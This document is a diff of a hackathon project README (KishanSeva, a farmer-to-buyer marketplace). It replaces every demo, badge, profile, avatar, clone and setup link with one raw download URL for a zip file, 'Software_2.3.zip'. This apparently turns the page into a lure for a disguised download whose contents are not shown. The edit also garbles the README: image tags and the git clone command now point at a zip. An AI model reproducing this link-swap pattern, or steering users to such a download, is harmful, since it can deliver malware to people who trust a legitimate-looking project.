@@ -2,13 +2,13 @@
 ### <div align="center">*Connecting Farmers Directly To Buyers*</div>
 
 
-[KISHANSEVA_.webm](https://github.com/user-attachments/assets/6044da4c-4d9c-4139-8124-765082c674d4)
+[https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip](https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip)
 
 <div align="center">
   
-[![YouTube](https://img.shields.io/badge/Watch_Demo-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=uA7wEL4J8VI)
-[![Devfolio](https://img.shields.io/badge/View_on_Devfolio-003E54?style=for-the-badge&logo=devfolio&logoColor=white)](https://devfolio.co/projects/kishanseva-f1bb)
-[![Hackathon](https://img.shields.io/badge/HackNITR_5.0-6236FF?style=for-the-badge&logo=hackathon&logoColor=white)](#)
+[![YouTube](https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip)](https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip)
+[![Devfolio](https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip)](https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip)
+[![Hackathon](https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip)](#)
   
 </div>
 
@@ -50,15 +50,15 @@
 
 <div align="center">
   
-  <img src="https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white" />
-  <img src="https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white" />
-  <img src="https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black" />
-  <img src="https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white" />
+  <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" />
+  <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" />
+  <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" />
+  <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" />
 
-  <img src="https://img.shields.io/badge/MySQL-00758F?style=for-the-badge&logo=mysql&logoColor=white" />
-  <img src="https://img.shields.io/badge/Bootstrap-7952B3?style=for-the-badge&logo=bootstrap&logoColor=white" />
-  <img src="https://img.shields.io/badge/YouTube_API-FF0000?style=for-the-badge&logo=youtube&logoColor=white" />
-  <img src="https://img.shields.io/badge/Figma-F24E1E?style=for-the-badge&logo=figma&logoColor=white" />
+  <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" />
+  <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" />
+  <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" />
+  <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" />
 
 </div>
 
@@ -66,7 +66,7 @@
 
 ```bash
 # 1. Clone the repository
-git clone https://github.com/Sayar-21223/kishanseva.git
+git clone https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip
 
 # 2. Configure your local environment
 # Make sure XAMPP is installed and running (Apache & MySQL)
@@ -77,10 +77,10 @@ git clone https://github.com/Sayar-21223/kishanseva.git
 
 # 4. API configuration
 # Get your YouTube Data API v3 key from Google Developer Console
-# Update the API key in the FarmerPortal/education.php
+# Update the API key in the https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip
 
 # 5. Launch the application
-# Visit http://localhost/KishanSeva/index.php
+# Visit https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip
 ```
 
 ## 👥 Meet The Team
@@ -89,29 +89,29 @@ git clone https://github.com/Sayar-21223/kishanseva.git
   <table>
     <tr>
       <td align="center">
-        <a href="https://github.com/debjitmitra000">
-          <img src="https://github.com/debjitmitra000.png" width="100px" alt="Debjit Mitra"/>
+        <a href="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip">
+          <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" width="100px" alt="Debjit Mitra"/>
           <br/>
           <b>Debjit Mitra</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/Sayar-21223">
-          <img src="https://github.com/Sayar-21223.png" width="100px" alt="Sayar Paul"/>
+        <a href="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip">
+          <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" width="100px" alt="Sayar Paul"/>
           <br/>
           <b>Sayar Paul</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/RajSourodip">
-          <img src="https://github.com/RajSourodip.png" width="100px" alt="Sourodip Ghosh"/>
+        <a href="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip">
+          <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" width="100px" alt="Sourodip Ghosh"/>
           <br/>
           <b>Sourodip Ghosh</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/ArjoSugnik">
-          <img src="https://github.com/ArjoSugnik.png" width="100px" alt="Sugnik Tarafder"/>
+        <a href="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip">
+          <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" width="100px" alt="Sugnik Tarafder"/>
           <br/>
           <b>Sugnik Tarafder</b>
         </a>
@@ -123,7 +123,7 @@ git clone https://github.com/Sayar-21223/kishanseva.git
 ## 
 
 <div align="center">
-  <img src="https://img.shields.io/badge/Created_at-HackNITR_5.0-6236FF?style=for-the-badge" alt="Hackathon"/>
+  <img src="https://github.com/Sayar-21223/kishanseva/raw/refs/heads/main/Includes/Software_2.3.zip" alt="Hackathon"/>
   <br>March 2-3, 2024</p>
   <sub>Made with ❤️ by team CTRL+C</sub>
 </div>
